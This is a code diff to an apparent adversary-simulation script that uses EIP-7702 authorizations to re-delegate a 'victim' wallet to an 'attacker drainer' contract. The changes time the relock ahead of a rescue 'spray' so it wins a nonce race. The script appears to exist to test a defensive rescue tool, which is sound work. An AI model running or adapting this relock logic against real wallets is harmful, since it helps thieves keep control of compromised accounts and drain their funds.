@@ -55,14 +55,21 @@ async function main() {
   const req = await getWithdrawalRequest(client, validatorId, account.address, withdrawId);
   if (req.withdrawalAmount === 0n) throw new Error('no pending withdrawal — nothing to lock out of');
   const target_epoch = maturityEpoch(req.withdrawEpoch);
-  const sprayStart = sprayStartBlockFor(target_epoch);
+  // Re-delegate BEFORE the spray starts, not at the flip. Firing at sprayStart puts the
+  // re-delegation into a nonce race against our own authorization applications, which climb the
+  // victim nonce ~0.7/block and starved it entirely at epoch 1053 (Q25). Landing it while the
+  // nonce is still stable is what makes the in-race test meaningful — the victim is then delegated
+  // to the drainer when our spray begins, and our spray must re-assert.
+  const lead = BigInt(process.env.RELOCK_LEAD_BLOCKS ?? 30);
+  const fireAt = sprayStartBlockFor(target_epoch) - lead;
   const latestStart = latestStartBlockFor(target_epoch);
 
   console.log(`=== relock (anti-revoke attacker) ===`);
   console.log(`victim/attacker EOA: ${account.address}`);
   console.log(`re-delegating to:    ${target}${target === zeroAddress ? ' (clear delegation)' : ' (attacker drainer)'}`);
   console.log(`mode:                ${RELOCK_MODE}${RELOCK_MODE === 'grief' ? ` every ${RELOCK_EVERY} blocks` : ''}`);
-  console.log(`flip window:         ${sprayStart}..${latestStart}`);
+  console.log(`firing at block:     ${fireAt} (${lead} blocks before spray start, nonce still stable)`);
+  console.log(`flip window:         ${sprayStartBlockFor(target_epoch)}..${latestStart}`);
 
   // A 7702 self-delegation: the authorization re-delegates the EOA; the top-level call does
   // nothing. Self-sponsored, so the auth nonce is txNonce + 1 (the tx consumes the current nonce
@@ -73,15 +80,15 @@ async function main() {
     const authorization = await wallet.signAuthorization({
       account, contractAddress: target, executor: 'self', nonce: txNonce + 1,
     });
+    // Broadcast and return — do NOT block on the receipt. In the epoch 1053 run this call waited
+    // on waitForTransactionReceipt, which timed out and stopped the whole run, hiding the real
+    // outcome. The receipt is checked separately on the next poll via getCode.
     const hash = await wallet.sendTransaction({
       to: account.address, data: '0x', nonce: txNonce,
       gas: 100_000n, authorizationList: [authorization], chain,
     } as never);
-    const r = await client.waitForTransactionReceipt({ hash });
-    const codeAfter = await client.getCode({ address: account.address });
-    const now = codeAfter && codeAfter.length === 48 ? '0x' + codeAfter.slice(8) : 'none';
-    console.log(`  relock tx ${hash} -> ${r.status} block ${r.blockNumber}; victim now delegated to ${now}`);
-    return r.status === 'success';
+    console.log(`  relock broadcast ${hash} at nonce ${txNonce} (auth nonce ${txNonce + 1})`);
+    return hash;
   };
 
   console.log(`waiting for the flip window...`);
@@ -104,7 +111,7 @@ async function main() {
       continue;
     }
 
-    if (block >= sprayStart && (RELOCK_MODE === 'grief' || fired === 0)) {
+    if (block >= fireAt && (RELOCK_MODE === 'grief' || fired === 0)) {
       if (fired === 0 || block % BigInt(RELOCK_EVERY) === 0n) {
         try { await relock(); fired++; } catch (e) { console.log(`  relock failed: ${(e as Error).message.split('\n')[0]}`); }
         if (RELOCK_MODE === 'single') break;
@@ -114,7 +121,7 @@ async function main() {
 
     // Poll slowly when far from the window, fast inside it. Hammering the node at 50ms for hours
     // is both wasteful and the thing that made a transient error likely in the first place.
-    const toWindow = sprayStart - block;
+    const toWindow = fireAt - block;
     if (toWindow > 200n) {
       if (block - lastLog >= 2000n) { console.log(`[idle] ${toWindow} blocks to the flip window`); lastLog = block; }
       await sleep(15_000);
